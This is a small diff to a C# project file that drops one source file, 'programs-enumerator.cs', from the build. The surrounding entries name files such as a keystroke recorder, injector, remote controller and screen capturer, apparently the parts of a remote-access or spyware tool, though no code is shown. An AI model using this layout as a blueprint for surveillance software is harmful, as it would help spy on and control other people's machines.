@@ -71,7 +71,6 @@
     <Compile Include="injector.cs" />
     <Compile Include="keystrokes-recorder.cs" />
     <Compile Include="program.cs" />
-    <Compile Include="programs-enumerator.cs" />
     <Compile Include="Properties\AssemblyInfo.cs" />
     <Compile Include="remote-controller.cs" />
     <Compile Include="screen-capturer.cs" />
